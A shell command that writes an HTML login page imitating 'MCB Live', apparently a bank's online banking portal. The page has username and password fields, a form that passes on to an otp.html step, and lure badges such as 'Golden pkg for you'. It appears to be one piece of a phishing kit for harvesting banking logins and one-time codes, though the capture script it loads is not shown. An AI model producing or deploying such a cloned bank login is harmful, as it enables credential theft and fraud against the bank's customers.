cat << 'EOF' > index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MCB Live - Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="right-container">

        <!-- Badges on Top -->
        <div class="badge-container">
            <div class="header-badge">🌟 Golden pkg for you</div>
            <div class="sub-badge">⏱️ Report Time: 24 Hours</div>
        </div>

        <!-- Branding -->
        <div class="brand-container">
            <div class="welcome-sub">MCB Live Logo</div>
            <div class="welcome-sub">Welcome to</div>
            <div class="brand-logo-text">MCB Live</div>
            <div class="services-text">📁 Explore Services</div>
        </div>

        <!-- Login Form -->
        <form action="otp.html" method="GET">
            <div class="input-group">
                <input type="text" placeholder="Username" required>
                <img src="user.svg" alt="User Icon">
            </div>
            <a href="#" class="forgot-link">Forgot Username?</a>

            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
                <img src="eye-off.svg" id="togglePassword" alt="Toggle Password">
            </div>
            <a href="#" class="forgot-link">Forgot Password?</a>

            <button type="submit" class="login-btn">Login</button>
        </form>

        <!-- Footer -->
        <div class="footer-links">
            <p>Not Registered Yet? <a href="#">Register for MCB Live</a></p>
            <div class="new-account">
                <span>📁 Open New MCB Account</span>
            </div>
        </div>

    </div>

    <script src="script.js"></script>
</body>
</html>
EOF
